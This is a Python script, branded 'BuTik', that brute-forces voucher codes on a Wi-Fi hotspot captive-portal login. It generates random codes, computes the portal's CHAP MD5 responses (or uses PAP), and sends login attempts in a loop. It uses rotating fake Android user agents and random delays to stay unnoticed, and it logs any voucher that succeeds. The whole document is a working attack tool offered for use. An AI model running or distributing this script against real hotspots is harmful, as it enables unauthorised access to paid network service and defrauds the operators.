import requests as req
import hashlib
import random, time, os, sys, re
import configparser

# Nonaktifkan peringatan SSL
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class c:
    purple = '\033[95m'
    ob = '\033[94m'
    oc = '\033[96m'
    og = '\033[92m'
    warn = '\033[93m'
    error = '\033[91m'
    n = '\033[0m'

def load_config():
    config = configparser.ConfigParser()
    if not os.path.exists('config.ini'):
        print(f"{c.error}[!] config.ini tidak ditemukan!{c.n}")
        sys.exit()
    config.read('config.ini')
    return config

def get_stealth_headers(url):
    user_agents = [
        "Mozilla/5.0 (Linux; Android 13; SM-A536B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; M2101K6G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.105 Mobile Safari/537.36"
        "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; 2210132G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.166 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; RMX3301) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.128 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.105 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; M2101K6G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36"
        "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; 2210132G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.166 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.196 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; CPH2521) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; V2231) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.162 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; RMX3301) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.128 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; 22111317G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.153 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; 22021211RG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.136 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; XQ-CT54) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.71 Mobile Safari/537.36" 
    ]
    return {
        'User-Agent': random.choice(user_agents),
        'X-Requested-With': 'com.android.browser',
        'Referer': url
    }

def extract_error(html):
    # Sesuaikan 'class="notice"' dengan template hotspot
    # untuk menangkap pesan error.
    match = re.search(r'class="notice">(.*?)</div>', html)
    return match.group(1).strip() if match else "Invalid credentials"

def main():
    conf = load_config()

    # Ambil nilai dari config
    target_base = conf['TARGET']['url']
    if not target_base.endswith('/'): target_base += '/'
    login_url = target_base + "login"

    charset = conf['SETTINGS']['charset']
    length = int(conf['SETTINGS']['length'])
    d_min = float(conf['SETTINGS']['delay_min'])
    d_max = float(conf['SETTINGS']['delay_max'])

    history_file = conf['HISTORY']['file']
    success_file = conf['HISTORY']['success']

    os.system('cls' if os.name == 'nt' else 'clear')
    print(f'''{c.og}
		BuTik
 =-------------------------------=
 SIMPLE BRUTEFORCE VOUCHER HOTSPOT
 =-------------------------------={c.oc}
 Version : {c.n}Alpha 1{c.oc}
 {c.n}''')
    print(f"Target: {c.oc}{conf['TARGET']['name']}{c.n} | Length: {length}\n")

    if os.path.exists(history_file):
        with open(history_file, "r") as f:
            history = set(line.strip() for line in f)
    else:
        history = set()

    session = req.Session()

    try:
        while True:
            code = "".join(random.choice(charset) for _ in range(length))
            if code in history: continue

            headers = get_stealth_headers(login_url)

            try:
                res_get = session.get(login_url, headers=headers, timeout=10, verify=False)

                # Ekstraksi CHAP
                chap_id_match = re.search(r"hexMD5\('([\s\S]*?)'", res_get.text)
                chap_challenge_match = re.search(r"'\)\s*\+\s*'([\s\S]*?)'", res_get.text)

                if chap_id_match and chap_challenge_match:
                    active_method = "CHAP"
                    cid, cchal = chap_id_match.group(1), chap_challenge_match.group(1)
                    combined = cid.encode() + code.encode() + cchal.encode()
                    pass_hash = hashlib.md5(combined).hexdigest()
                    payload = {'username': code, 'password': pass_hash, 'dst': '', 'popup': 'true', 'chap-id': cid, 'chap-challenge': cchal}
                else:
                    active_method = "PAP"
                    payload = {'username': code, 'password': code, 'dst': '', 'popup': 'true'}

                res_post = session.post(login_url, data=payload, headers=headers, timeout=10, verify=False)

                if "success" in res_post.text.lower():
                    print(f"\n{c.og}[SUCCESS] Found: {code}{c.n}")
                    print(f"{c.og}[!] Script dihentikan.{c.n}")
                    with open(success_file, "a") as f:
                        f.write(f"Voucher: {code} | Method: {active_method} | Target: {target_base} | {time.ctime()}\n")

                    os._exit(0)

                error_msg = extract_error(res_post.text)
                print(f" [{c.oc}{active_method}{c.n}] Code: {c.purple}{code}{c.n} | Res: {c.warn}{error_msg}{c.n}", flush=True)

                history.add(code)
                with open(history_file, "a") as f: f.write(f"{code}\n")

                time.sleep(random.uniform(d_min, d_max))

            except Exception:
                print(f" [{c.error}!{c.n}] Connection Error. Retrying...")
                time.sleep(5)

    except KeyboardInterrupt:
        print(f"\n{c.error}[!] Dibatalkan.{c.n}")

if __name__ == "__main__":
    main()

